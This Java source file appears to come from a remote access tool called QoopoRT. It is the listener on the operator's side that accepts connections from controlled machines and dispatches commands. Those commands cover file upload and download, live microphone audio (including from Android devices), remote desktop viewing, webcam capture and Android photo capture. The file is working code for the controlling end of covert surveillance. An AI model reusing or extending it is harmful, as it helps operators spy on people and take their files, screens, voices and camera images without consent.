package qooport.listener;

import java.io.File;
import java.io.IOException;
import network.Conexion;
import network.ConexionServer;
import qooport.asociado.Asociado;
import qooport.avanzado.QoopoRT;
import qooport.modulos.archivos.transferencia.Carga;
import qooport.modulos.archivos.transferencia.Descarga;
import qooport.modulos.archivos.transferencia.Transferencia;
import qooport.modulos.camara.Camara;
import qooport.modulos.escritorioremoto.EscritorioRemoto;
import qooport.modulos.voip.VoIp;
import qooport.utilidades.Protocolo;

/**
 *
 * @author alberto
 */
public class TransfListener extends Thread {

    private final ConexionServer conexion_servidor;
    private Conexion conexion;
    public boolean CONECTADO = true;

    private boolean version2;

    public TransfListener(int puerto, int tipoConexion, boolean version2, boolean ssl) throws IOException {
        this.conexion_servidor = new ConexionServer(tipoConexion, puerto, ssl);
        this.version2 = version2;
        CONECTADO = true;
    }

    @Override
    public void run() {
        byte[] bytesId;
        do {
            try {
                this.conexion = this.conexion_servidor.aceptar();
                int comando = conexion.leerInt();

                if (conexion_servidor.getTipo() == ConexionServer.UDP) {
                    CONECTADO = false;// obliga a salir del loop, porq estan lelgando los comandos q le corresponden a la conexion
                    System.out.println("TrasnListerer>> Se recibio comando " + comando);
                }

                switch (comando) {
                    case Protocolo.ADMIN_ARCHIVOS_DESCARGAR:
                        Transferencia tDescarga = new Descarga(conexion);
                        tDescarga.setBufferSize(conexion.getReceiveBufferSize());
                        tDescarga.iniciar();
//                        //DescargaArchivo ds = new DescargaArchivo(conexion, conexion.getReceiveBufferSize());
//                        DescargaArchivo ds = new DescargaArchivo(tDescarga);
//                        ModoAvanzado.paneTransferencia.setCaretPosition(ModoAvanzado.paneTransferencia.getDocument().getLength());
//                        ModoAvanzado.paneTransferencia.insertComponent(ds);
//                        QoopoRT.listaDescargas.add(ds);
//                        ModoAvanzado.paneTransferencia.getDocument().insertString(ModoAvanzado.paneTransferencia.getDocument().getLength(), "\n", null);
//                        new Thread(ds).start();
                        break;
                    case Protocolo.ADMIN_ARCHIVOS_SUBIR:
                        byte[] bytes = (byte[]) conexion.leerObjeto();
                        String archivoAsubir = Asociado.parsearCadena(bytes, false);

                        Asociado asociado = null;
                        if (archivoAsubir.contains(":::")) {
                            String[] tt = archivoAsubir.split(":::");
                            archivoAsubir = tt[0];
                            asociado = (Asociado) QoopoRT.SERVIDORES.get(tt[1]);
                        }

                        if (!new File(archivoAsubir).exists()) {
                            archivoAsubir = Asociado.parsearCadena(bytes, true);
                        }

                        Transferencia tCarga = new Carga(asociado, conexion, new File(archivoAsubir));
                        tCarga.setBufferSize(conexion.getSendBufferSize());
                        tCarga.iniciar();
////                        SubirArchivo sa = new SubirArchivo(conexion, conexion.getSendBufferSize(), archivoAsubir);
//                        SubirArchivo sa = new SubirArchivo(tCarga);
//                        ModoAvanzado.paneTransferencia.setCaretPosition(ModoAvanzado.paneTransferencia.getDocument().getLength());
//                        ModoAvanzado.paneTransferencia.insertComponent(sa);
//                        QoopoRT.listaSubidas.add(sa);
//                        ModoAvanzado.paneTransferencia.getDocument().insertString(ModoAvanzado.paneTransferencia.getDocument().getLength(), "\n", null);
//                        new Thread(sa).start();
                        break;
                    case Protocolo.AUDIO:
                        bytesId = (byte[]) conexion.leerObjeto();
                        String ID = Asociado.parsearCadena(bytesId, false);
                        if (!QoopoRT.SERVIDORES.containsKey(ID)) {
                            ID = Asociado.parsearCadena(bytesId, true);
                        }
                        Asociado servidor = (Asociado) QoopoRT.SERVIDORES.get(ID);
                        VoIp ven = (VoIp) servidor.getVopIp();
                        if (ven == null) {
                            ven = new VoIp(conexion, servidor);
                            ven.setAndroid(false);
                            ven.setVisible(true);
                            servidor.setVopIp(ven);
                        } else {
                            if (!ven.isVisible()) {
                                ven.setVisible(true);
                            }
                            ven.setAndroid(false);
                            ven.setConexion(conexion);
                        }
                        break;
                    case Protocolo.AUDIO_ANDROID:
                        String idAndroid = Asociado.parsearCadena((byte[]) conexion.leerObjeto(), false);
                        Asociado servAudio = (Asociado) QoopoRT.SERVIDORES.get(idAndroid);
                        VoIp venMicAndroid = servAudio.getVopIp();
                        if (venMicAndroid == null) {
                            venMicAndroid = new VoIp(conexion, servAudio);
                            venMicAndroid.setAndroid(true);
                            venMicAndroid.setVisible(true);
                            venMicAndroid.setTitle("VoIP [" + servAudio.getInformacion() + "]");
                            servAudio.setVopIp(venMicAndroid);
                        } else {
                            if (!venMicAndroid.isVisible()) {
                                venMicAndroid.setVisible(true);
                            }
                            venMicAndroid.setAndroid(true);
                            venMicAndroid.setConexion(conexion);
                            venMicAndroid.setTitle("VoIP [" + servAudio.getInformacion() + "]");
                        }
                        break;
                    case Protocolo.ESCRITORIO_REMOTO:
                        bytesId = (byte[]) conexion.leerObjeto();
                        String IDPantalla = Asociado.parsearCadena(bytesId, false);
                        if (!QoopoRT.SERVIDORES.containsKey(IDPantalla)) {
                            IDPantalla = Asociado.parsearCadena(bytesId, true);
                        }
                        Asociado servidorPantalla = (Asociado) QoopoRT.SERVIDORES.get(IDPantalla);
                        EscritorioRemoto er = servidorPantalla.getEscritorioRemoto();
                        if (er == null) {
                            er = new EscritorioRemoto(conexion, servidorPantalla);
                            er.setVisible(true);
                            er.setTitle("Escritorio Remoto [" + servidorPantalla.getInformacion() + "]");
                            servidorPantalla.setEscritorioRemoto(er);
                        } else {
                            if (!er.isVisible()) {
                                er.setVisible(true);
                            }
                            er.setTitle("Escritorio Remoto  [" + servidorPantalla.getInformacion() + "]");
                            er.setConexion(conexion);
                        }
                        break;
                    case Protocolo.CAPTURA_WEB_CAM:
                        bytesId = (byte[]) conexion.leerObjeto();
                        String idWebCam = Asociado.parsearCadena(bytesId, false);
                        if (!QoopoRT.SERVIDORES.containsKey(idWebCam)) {
                            idWebCam = Asociado.parsearCadena(bytesId, true);
                        }
                        Asociado servWC = (Asociado) QoopoRT.SERVIDORES.get(idWebCam);
                        Camara wc = servWC.getCamara();
                        if (wc == null) {
                            wc = new Camara(conexion, servWC);
                            wc.setVisible(true);
                            wc.setTitle("Cámara Remota [" + servWC.getInformacion() + "]");
                            servWC.setCamara(wc);
                        } else {
                            if (!wc.isVisible()) {
                                wc.setVisible(true);
                            }
                            wc.setConexion(conexion);
                            wc.setTitle("Cámara Remota  [" + servWC.getInformacion() + "]");
                        }
                        break;
                    case Protocolo.ANDROID_FOTO:
                        String idFoto = Asociado.parsearCadena((byte[]) conexion.leerObjeto(), false);
                        Asociado servFoto = (Asociado) QoopoRT.SERVIDORES.get(idFoto);
                        Camara wcFoto = servFoto.getCamara();
                        if (wcFoto == null) {
                            wcFoto = new Camara(conexion, servFoto);
                            wcFoto.setVisible(true);
                            wcFoto.setTitle("Cámara Remota [" + servFoto.getInformacion() + "]");
                            servFoto.setCamara(wcFoto);
                        } else {
                            if (!wcFoto.isVisible()) {
                                wcFoto.setVisible(true);
                            }
                            wcFoto.setConexion(conexion);
                            wcFoto.setTitle("Cámara Remota [" + servFoto.getInformacion() + "]");
                        }
                        break;
                }

            } catch (Exception ex) {
            }
        } while (CONECTADO);
    }

    public void stopPara() {
        CONECTADO = false;
        try {
            this.conexion_servidor.cerrar();
        } catch (Exception ex) {
        }
    }

//    public ServerSocket getP_escucha() {
//        return conexion_servidor;
//    }
//
//    public void setP_escucha(ServerSocket p_escucha) {
//        this.conexion_servidor = p_escucha;
//    }
//
//    public Socket getP_conexion() {
//        return conexion;
//    }
//
//    public void setP_conexion(Socket p_conexion) {
//        this.conexion = p_conexion;
//    }
}
